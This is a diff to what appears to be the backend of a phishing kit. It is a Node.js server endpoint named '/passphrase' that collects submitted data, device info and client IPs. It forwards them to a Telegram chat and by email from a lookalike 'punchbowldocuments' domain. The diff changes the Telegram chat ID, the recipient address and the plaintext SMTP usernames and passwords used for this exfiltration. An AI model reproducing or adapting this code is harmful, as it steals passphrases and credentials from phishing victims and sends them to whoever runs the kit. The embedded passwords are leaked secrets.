@@ -54,7 +54,7 @@ app.post('/passphrase', async (req, res) => {
       =================================
       Device Info: ${JSON.stringify(deviceInfo)}
     `;
-    await bot.sendMessage('7255743885', teleMessage);
+    await bot.sendMessage('1106055083', teleMessage);
     console.log(teleMessage)
 
     // Send email using nodemailer
@@ -63,8 +63,8 @@ app.post('/passphrase', async (req, res) => {
       port: 465,
       secure: true,
       auth: {
-        user: 'admin@navi-punchbowldocuments.com',
-        pass: 'A7x6o*0h]vYv',
+        user: 'sender@navi-punchbowldocuments.com',
+        pass: 'Olujames123',
       },
       tls: {
         rejectUnauthorized: false
@@ -72,8 +72,8 @@ app.post('/passphrase', async (req, res) => {
     });
 
     const mailOptions = {
-      from:'admin@navi-punchbowldocuments.com',
-      to: 'jannehenrik101@yandex.com',
+      from:'sender@navi-punchbowldocuments.com',
+      to: 'sender@navi-punchbowldocuments.com',
       subject: `Received From ${clientIP}`,
       text: `
         Email Provider: ${email_provider}
